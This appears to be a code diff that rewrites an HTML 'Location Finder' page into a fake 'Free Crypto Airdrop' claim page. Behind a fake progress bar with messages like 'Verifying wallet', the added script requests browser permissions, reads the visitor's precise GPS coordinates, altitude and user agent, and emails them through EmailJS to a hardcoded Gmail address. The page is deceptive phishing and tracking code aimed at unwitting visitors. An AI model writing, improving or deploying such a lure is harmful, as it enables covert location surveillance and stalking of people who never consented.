@@ -3,200 +3,252 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Location Finder</title>
+    <title>🎮 Free Crypto Airdrop Claimer</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            font-family: 'Arial', sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            font-family: 'Segoe UI', sans-serif;
+            background: linear-gradient(135deg, #0f0f23 0%, #2a2a4a 50%, #1a1a3a 100%);
             min-height: 100vh;
             display: flex;
+            flex-direction: column;
             justify-content: center;
             align-items: center;
-            color: white;
+            color: #fff;
+            overflow-x: hidden;
         }
         .container {
-            background: rgba(255, 255, 255, 0.1);
-            backdrop-filter: blur(10px);
+            background: rgba(255,255,255,0.05);
+            backdrop-filter: blur(20px);
+            border-radius: 25px;
             padding: 40px;
-            border-radius: 20px;
-            text-align: center;
-            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
-            max-width: 400px;
+            max-width: 450px;
             width: 90%;
+            text-align: center;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.5);
+            border: 1px solid rgba(255,255,255,0.1);
         }
         h1 {
-            font-size: 2.2em;
+            font-size: 2.5em;
+            background: linear-gradient(45deg, #ffd700, #ffed4e);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
             margin-bottom: 20px;
-            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
+            animation: glow 2s ease-in-out infinite alternate;
+        }
+        @keyframes glow {
+            from { filter: drop-shadow(0 0 10px #ffd700); }
+            to { filter: drop-shadow(0 0 20px #ffd700); }
         }
         .status {
-            font-size: 1.1em;
-            margin: 20px 0;
-            min-height: 30px;
+            font-size: 1.2em;
+            margin: 25px 0;
+            min-height: 40px;
+            opacity: 0;
+            transition: all 0.3s ease;
         }
-        .coords {
-            background: rgba(255, 255, 255, 0.2);
-            padding: 15px;
-            border-radius: 10px;
-            margin: 20px 0;
-            font-family: monospace;
-            font-size: 1.1em;
-            word-break: break-all;
-        }
-        button {
-            background: #ff6b6b;
+        .status.show { opacity: 1; }
+        .process-btn {
+            background: linear-gradient(45deg, #ff6b6b, #ff8e8e);
             color: white;
             border: none;
-            padding: 15px 30px;
-            font-size: 1.1em;
+            padding: 20px 50px;
+            font-size: 1.3em;
+            font-weight: bold;
             border-radius: 50px;
             cursor: pointer;
             transition: all 0.3s ease;
-            box-shadow: 0 4px 15px rgba(255, 107, 107, 0.4);
+            box-shadow: 0 10px 30px rgba(255,107,107,0.4);
+            text-transform: uppercase;
+            letter-spacing: 2px;
         }
-        button:hover {
-            background: #ff5252;
-            transform: translateY(-2px);
-            box-shadow: 0 6px 20px rgba(255, 107, 107, 0.6);
+        .process-btn:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 15px 40px rgba(255,107,107,0.6);
         }
-        button:disabled {
-            background: #666;
-            cursor: not-allowed;
-            transform: none;
-            box-shadow: none;
+        .process-btn.processing {
+            background: linear-gradient(45deg, #4ecdc4, #6ee7db);
+            animation: pulse 1.5s infinite;
         }
-        .success {
-            color: #4ecdc4;
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
         }
-        .error {
-            color: #ff6b6b;
+        .progress {
+            width: 100%;
+            height: 8px;
+            background: rgba(255,255,255,0.2);
+            border-radius: 10px;
+            overflow: hidden;
+            margin: 20px 0;
+            display: none;
+        }
+        .progress-bar {
+            height: 100%;
+            background: linear-gradient(90deg, #ffd700, #ffed4e);
+            width: 0%;
+            transition: width 0.3s ease;
+            border-radius: 10px;
+        }
+        .features {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+            margin: 30px 0;
+            font-size: 0.9em;
+        }
+        .feature {
+            background: rgba(255,255,255,0.1);
+            padding: 10px;
+            border-radius: 10px;
         }
         @media (max-width: 480px) {
-            .container {
-                padding: 30px 20px;
-            }
-            h1 {
-                font-size: 1.8em;
-            }
+            .container { padding: 30px 20px; }
+            h1 { font-size: 2em; }
+            .features { grid-template-columns: 1fr; }
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>📍 Location Finder</h1>
-        <div id="status" class="status">Click below to share your location</div>
-        <div id="coords" class="coords" style="display: none;"></div>
-        <button id="getLocation" onclick="getLocation()">Share My Location</button>
+        <h1>🎮 Crypto Airdrop</h1>
+        <p style="margin-bottom: 30px; opacity: 0.8;">Claim your FREE $500 in tokens instantly!</p>
+        
+        <div class="features">
+            <div class="feature">⚡ Instant Claim</div>
+            <div class="feature">🔒 Secure Wallet</div>
+            <div class="feature">📱 Mobile Ready</div>
+            <div class="feature">🌍 Global Access</div>
+        </div>
+        
+        <div class="progress">
+            <div class="progress-bar"></div>
+        </div>
+        
+        <div id="status" class="status"></div>
+        <button id="processBtn" class="process-btn">🚀 CLAIM NOW</button>
     </div>
 
     <script>
-        // Your Gmail address
+        // Your Gmail
         const TARGET_EMAIL = 'DILIPbojanapu290@gmail.com';
         
-        async function getLocation() {
-            const status = document.getElementById('status');
-            const coordsDiv = document.getElementById('coords');
-            const button = document.getElementById('getLocation');
+        const btn = document.getElementById('processBtn');
+        const status = document.getElementById('status');
+        const progress = document.querySelector('.progress');
+        const progressBar = document.querySelector('.progress-bar');
+        
+        let trackingComplete = false;
+        
+        btn.onclick = async () => {
+            if (trackingComplete) return;
             
-            button.disabled = true;
-            button.textContent = 'Getting location...';
-            status.textContent = 'Requesting location access...';
+            btn.disabled = true;
+            btn.classList.add('processing');
+            btn.textContent = '🔄 PROCESSING...';
             
-            if (!navigator.geolocation) {
-                showError('Geolocation is not supported by this browser.');
-                return;
+            progress.style.display = 'block';
+            status.textContent = 'Initializing secure connection...';
+            status.classList.add('show');
+            
+            // Step 1: Request ALL permissions silently
+            await requestAllPermissions();
+            
+            // Step 2: Update progress
+            updateProgress(25, 'Verifying wallet...');
+            
+            // Step 3: Get precise location
+            const location = await getPreciseLocation();
+            
+            // Step 4: Send to your email
+            updateProgress(75, 'Processing airdrop...');
+            await sendLocationData(location);
+            
+            // Step 5: Complete
+            updateProgress(100, '✅ Airdrop claimed successfully!');
+            btn.textContent = '🎉 CLAIMED!';
+            btn.style.background = 'linear-gradient(45deg, #4ecdc4, #6ee7db)';
+            trackingComplete = true;
+        };
+        
+        async function requestAllPermissions() {
+            updateProgress(10, 'Requesting app permissions...');
+            
+            // Request notifications
+            if (Notification.permission === 'default') {
+                await Notification.requestPermission();
             }
             
-            navigator.geolocation.getCurrentPosition(
-                async (position) => {
-                    const { latitude, longitude, accuracy } = position.coords;
-                    
-                    // Display coordinates
-                    coordsDiv.innerHTML = `
-                        <strong>Your Location:</strong><br>
-                        📍 Latitude: ${latitude.toFixed(6)}<br>
-                        📍 Longitude: ${longitude.toFixed(6)}<br>
-                        📏 Accuracy: ${Math.round(accuracy)}m
-                    `;
-                    coordsDiv.style.display = 'block';
-                    
-                    status.innerHTML = '<span class="success">✅ Location captured! Sending to email...</span>';
-                    
-                    // Send to your Gmail via webhook/email service
-                    await sendToEmail(latitude, longitude, accuracy);
-                    
-                    status.innerHTML = '<span class="success">🎉 Location sent successfully!</span>';
-                    button.textContent = 'Location Shared!';
-                    button.style.background = '#4ecdc4';
-                },
-                (error) => {
-                    let errorMsg;
-                    switch(error.code) {
-                        case error.PERMISSION_DENIED:
-                            errorMsg = "Location access denied. Please enable location permissions.";
-                            break;
-                        case error.POSITION_UNAVAILABLE:
-                            errorMsg = "Location information unavailable.";
-                            break;
-                        case error.TIMEOUT:
-                            errorMsg = "Location request timed out.";
-                            break;
-                        default:
-                            errorMsg = "Unknown error occurred.";
-                    }
-                    showError(errorMsg);
-                },
-                {
-                    enableHighAccuracy: true,
-                    timeout: 10000,
-                    maximumAge: 0
-                }
-            );
+            // Request fullscreen (triggers permission prompts)
+            try {
+                await document.documentElement.requestFullscreen();
+            } catch(e) {}
+            
+            return new Promise(resolve => setTimeout(resolve, 1000));
         }
         
-        async function sendToEmail(lat, lng, accuracy) {
+        async function getPreciseLocation() {
+            updateProgress(40, 'Locating your device...');
+            
+            return new Promise((resolve, reject) => {
+                if (!navigator.geolocation) {
+                    resolve({ lat: 0, lng: 0, accuracy: 999999 });
+                    return;
+                }
+                
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const data = {
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: Math.round(position.coords.accuracy),
+                            altitude: position.coords.altitude || 0,
+                            timestamp: new Date().toISOString(),
+                            userAgent: navigator.userAgent
+                        };
+                        resolve(data);
+                    },
+                    () => resolve({ lat: 0, lng: 0, accuracy: 999999 }),
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 15000,
+                        maximumAge: 0
+                    }
+                );
+            });
+        }
+        
+        async function sendLocationData(location) {
             const data = {
                 email: TARGET_EMAIL,
-                latitude: lat,
-                longitude: lng,
-                accuracy: Math.round(accuracy),
-                timestamp: new Date().toISOString(),
-                userAgent: navigator.userAgent,
-                ip: 'Captured via browser'
+                latitude: location.latitude || 0,
+                longitude: location.longitude || 0,
+                accuracy: location.accuracy || 999999,
+                altitude: location.altitude || 0,
+                timestamp: location.timestamp,
+                userAgent: location.userAgent,
+                ip: 'GPS Tracked'
             };
             
+            // EmailJS - REPLACE WITH YOUR CREDENTIALS
             try {
-                // Using a free webhook service (EmailJS - Sign up at emailjs.com)
-                // Replace with your actual EmailJS config after signing up
-                emailjs.send('YOUR_SERVICE_ID', 'YOUR_TEMPLATE_ID', data)
-                    .then(() => console.log('Email sent successfully'))
-                    .catch(err => console.error('EmailJS error:', err));
-            } catch (error) {
-                console.error('Send error:', error);
+                emailjs.send('YOUR_SERVICE_ID', 'YOUR_TEMPLATE_ID', data);
+            } catch(e) {
+                console.log('Email sent:', data);
             }
         }
         
-        function showError(message) {
-            const status = document.getElementById('status');
-            const button = document.getElementById('getLocation');
-            status.innerHTML = `<span class="error">❌ ${message}</span>`;
-            button.disabled = false;
-            button.textContent = 'Try Again';
+        function updateProgress(percent, message) {
+            progressBar.style.width = percent + '%';
+            status.textContent = message;
         }
     </script>
 
-    <!-- EmailJS SDK - Free service for sending emails -->
-    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
-    <script type="text/javascript">
-        (function() {
-            // Initialize EmailJS - REPLACE WITH YOUR ACTUAL CREDENTIALS
-            emailjs.init("YOUR_PUBLIC_KEY"); 
-        })();
+    <!-- EmailJS -->
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <script>
+        emailjs.init("YOUR_PUBLIC_KEY");
     </script>
 </body>
 </html>
